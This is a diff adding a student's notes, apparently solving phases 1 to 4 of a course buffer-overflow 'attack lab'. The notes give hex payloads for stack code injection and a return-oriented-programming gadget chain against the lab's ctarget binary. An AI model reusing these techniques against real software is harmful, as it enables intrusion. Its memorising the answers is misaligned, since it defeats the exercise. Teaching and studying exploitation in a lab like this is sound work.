@@ -1,0 +1,77 @@
+icat test1.txt  | ./hex2raw  | ./ctarget
+
+ gcc -c phase3.s
+ objdump -d phase3.o //gives bit representation of memory address
+
+Phase1:
+    - 0x28 is allocated to the stack at the beginning of getbuf, telling us the size of the array 
+    - Get the memory address of touch1 and pad it with additional bits to make a byte in little endian order
+
+Phase2:
+    -Convert the cookie address into bits that is what we will pass in as the password at the beginning of the array
+    - then we overflow the buffer with 0x28 bits
+    - we then need to find what register is passing the argument, which is %rsp 
+    - in order to store the correct argument and ensure rsp is not overwritten we subtract the stack amount from its address
+    - now rsp holds the correct cookie value 
+    - next we overwrite the return address such that it goes to touch2 with the rsp register as an argument giving us the correct cookie 
+48 c7 c7 c0 c6 15 6b c3 //cookie 
+00 00 00 00 00 00 00 00 /->
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 Buffer overflow
+00 00 00 00 00 00 00 00 <-/
+c8 8d 62 55 00 00 00 00 rsp address minus 0x28
+40 13 40 00 00 00 00 00 //touch 2 address 
+
+****You don't necessarily have to subtract 0x28 as long as you get the address of rsp after you input the string of max length.  if you get the address before the input then you must subtract the stack length to revert to the beginning of the array
+
+Phase 3
+
+get rsp after input  0x55628dc8 = c8 8d 62 55 00 00 00 00
+rsp + 0x38 = 0x55628e00 = 48 c7 c7 00 8e 62 55 c3
+
+
+48 c7 c7 00 8e 62 55 c3 // rsp address (after string input)  + 0x38 -> points to cookie
+00 00 00 00 00 00 00 00 // buffer   
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 //
+c8 8d 62 55 00 00 00 00 // rsp address (after string input)
+51 14 40 00 00 00 00 00 // touch3 address 
+36 62 31 35 63 36 63 30 // cookie as string 
+
+Phase 4 
+
+0000000000401503 <setval_233>:
+  401503:	c7 07 58 c3 ae 24    	movl   $0x24aec358,(%rdi)
+  401509:	c3  
+ 0x401503 + 2 = 0x401505   
+ 
+popq %rax // gadget 1
+
+
+00000000004014ee <addval_352>:
+  4014ee:	8d 87 48 89 c7 91    	lea    -0x6e3876b8(%rdi),%eax
+  4014f4:	c3                   	
+  
+  0x4014ee + 2 = 0x4014f0
+   
+movq %rax %edi // gadget 2
+
+
+popq %rax
+movq %rax %edi
+ret 
+
+ 
+00 00 00 00 00 00 00 00  //buffer
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00  //buffer
+05 15 40 00 00 00 00 00  // gadget 1 
+c0 c6 15 6b 00 00 00 00  // cookie
+f0 14 40 00 00 00 00 00  // gadget 2
+40 13 40 00 00 00 00 00  //touch2 
+
+
+
